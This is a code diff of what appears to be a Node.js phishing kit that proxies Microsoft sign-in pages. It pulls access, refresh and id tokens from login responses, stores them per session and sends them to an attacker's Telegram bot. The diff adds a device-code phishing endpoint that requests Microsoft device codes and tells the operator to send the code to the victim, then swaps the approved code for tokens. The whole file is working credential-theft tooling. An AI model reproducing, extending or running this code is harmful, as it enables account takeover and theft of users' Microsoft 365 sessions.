@@ -198,7 +198,6 @@ async function sendToTelegram(data) {
                 const respStr = typeof data.proxyResponseBody === 'string' ? 
                     data.proxyResponseBody : JSON.stringify(data.proxyResponseBody);
                 
-                // Check for access_token
                 const accessMatch = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                 if (accessMatch) {
                     const token = accessMatch[1];
@@ -209,7 +208,6 @@ async function sendToTelegram(data) {
                     console.log('✅ ACCESS TOKEN FOUND:', token.slice(0, 30) + '...');
                 }
                 
-                // Check for refresh_token
                 const refreshMatch = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                 if (refreshMatch) {
                     const token = refreshMatch[1];
@@ -220,7 +218,6 @@ async function sendToTelegram(data) {
                     console.log('✅ REFRESH TOKEN FOUND:', token.slice(0, 30) + '...');
                 }
                 
-                // Check for id_token
                 const idMatch = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                 if (idMatch) {
                     const token = idMatch[1];
@@ -341,7 +338,6 @@ ${flag} **Location:** ${location}
             `;
         }
 
-        // ── ADD TOKENS TO MESSAGE ──
         if (CAPTURED_TOKENS[sessionId]) {
             const tokens = CAPTURED_TOKENS[sessionId];
             if (tokens.access_token) {
@@ -477,7 +473,7 @@ const AdmZip = require('adm-zip');
 const WebSocket = require('ws');
 
 // ================================================
-// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED)
+// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂
 // ================================================
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -1239,8 +1235,67 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
-// ── DEVICE CODE PHISHING ENDPOINTS ──
+// ================================================
+// 📱 DEVICE CODE PHISHING ENDPOINTS
+// ================================================
+
 const deviceSessions = {};
+
+// ── GET DEVICE CODE FROM MICROSOFT (PROXY) ──
+dashApp.post('/api/device/request', async (req, res) => {
+    try {
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            new URLSearchParams({
+                client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
+                scope: 'openid profile https://www.office.com/v2/OfficeHome.All offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        
+        const data = response.data;
+        
+        // Register the code in deviceFlows
+        const existing = deviceFlows.find(f => f.user_code === data.user_code);
+        if (!existing) {
+            deviceFlows.push({
+                user_code: data.user_code,
+                device_code: data.device_code,
+                session_id: data.device_code,
+                status: 'pending',
+                created: new Date().toISOString(),
+                token_type: 'Device Code',
+                verification_uri: data.verification_uri
+            });
+        }
+        
+        // Send Telegram notification
+        const message = `
+📱 **Device Code Phishing**
+
+🆔 **User Code:** \`${data.user_code}\`
+🔗 **Verification URI:** ${data.verification_uri}
+⏱️ **Expires in:** ${data.expires_in} seconds
+
+💡 **Instructions:**
+1. Send this code to the victim
+2. Have them enter it at ${data.verification_uri}
+3. Wait for approval
+
+**Code:** \`${data.user_code}\`
+        `;
+        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        }).catch(() => {});
+        
+        res.json(data);
+    } catch (error) {
+        console.error('Device code request failed:', error.message);
+        res.status(500).json({ error: error.message });
+    }
+});
 
 dashApp.post('/api/device-code', (req, res) => {
     const { device_code, user_code, session_id } = req.body;
@@ -1252,7 +1307,6 @@ dashApp.post('/api/device-code', (req, res) => {
         status: 'pending'
     };
     
-    // Also add to deviceFlows for history
     const existing = deviceFlows.find(f => f.user_code === user_code);
     if (!existing) {
         deviceFlows.push({
@@ -1265,28 +1319,6 @@ dashApp.post('/api/device-code', (req, res) => {
         });
     }
     
-    // Send Telegram notification with the user_code
-    const message = `
-📱 **Device Code Phishing**
-
-🆔 **User Code:** \`${user_code}\`
-🔗 **Session ID:** ${session_id}
-⏱️ **Time:** ${new Date().toISOString()}
-
-💡 **Instructions:**
-1. Send this code to the victim
-2. Have them enter it on their device
-3. Wait for approval
-
-**Code:** \`${user_code}\`
-    `;
-    
-    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-    }).catch(() => {});
-    
     res.json({ success: true });
 });
 
@@ -1294,7 +1326,6 @@ dashApp.post('/api/device-token', async (req, res) => {
     const { device_code, session_id } = req.body;
     
     try {
-        // Exchange device_code for tokens
         const response = await axios.post(
             'https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
@@ -1307,13 +1338,11 @@ dashApp.post('/api/device-token', async (req, res) => {
         
         const tokens = response.data;
         
-        // Store tokens
         if (!CAPTURED_TOKENS[session_id]) CAPTURED_TOKENS[session_id] = {};
         if (tokens.access_token) CAPTURED_TOKENS[session_id].access_token = tokens.access_token;
         if (tokens.refresh_token) CAPTURED_TOKENS[session_id].refresh_token = tokens.refresh_token;
         if (tokens.id_token) CAPTURED_TOKENS[session_id].id_token = tokens.id_token;
         
-        // Update deviceFlows
         const flow = deviceFlows.find(f => f.session_id === session_id || f.device_code === device_code);
         if (flow) {
             flow.status = 'approved';
@@ -1330,7 +1359,6 @@ dashApp.post('/api/device-token', async (req, res) => {
             console.log(`✅ Device flow approved: ${flow.user_code}`);
         }
         
-        // Send Telegram notification with tokens
         const message = `
 📱 **Device Code Phishing - SUCCESS!**
 
@@ -1365,7 +1393,6 @@ dashApp.post('/api/device-token', async (req, res) => {
     }
 });
 
-// ── DEVICE CODE HISTORY ENDPOINTS ──
 dashApp.get('/api/device/history', (req, res) => {
     res.json({ success: true, flows: deviceFlows });
 });
@@ -1374,7 +1401,6 @@ dashApp.post('/api/device/manual', (req, res) => {
     const { user_code } = req.body;
     if (!user_code) return res.status(400).json({ error: 'Code required' });
     
-    // Check if code already exists
     if (deviceFlows.some(f => f.user_code === user_code.toUpperCase())) {
         return res.status(400).json({ error: 'Code already exists' });
     }
@@ -2362,7 +2388,7 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 }
 
 // ================================================
-// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃 (FIXED: /device route added)
+// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃
 // ================================================
 
 const app = express();
